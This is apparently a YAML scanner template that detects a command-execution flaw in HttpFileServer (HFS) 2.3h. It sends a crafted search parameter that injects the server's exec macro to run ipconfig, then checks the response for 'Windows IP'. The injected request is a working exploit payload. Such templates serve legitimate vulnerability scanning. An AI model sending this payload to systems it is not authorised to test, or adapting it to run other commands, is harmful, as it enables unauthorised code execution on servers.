# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - Windows IP
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/?search=%25xxx%25url%25:%password%}{.exec|ipconfig|timeout=5|out=abc.}RESULT:{.^abc.}'
id: hfs-rce-cmd-exec
info:
  author: chatgpt
  description: 检测 HttpFileServer (HFS) v2.3h 存在命令执行漏洞，允许远程攻击者通过构造特定 search 参数执行系统命令。
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: HFS 2.3h 命令执行漏洞检测
  severity: critical
  tags: rce,hfs,cve,cve2014,windows,argus-import
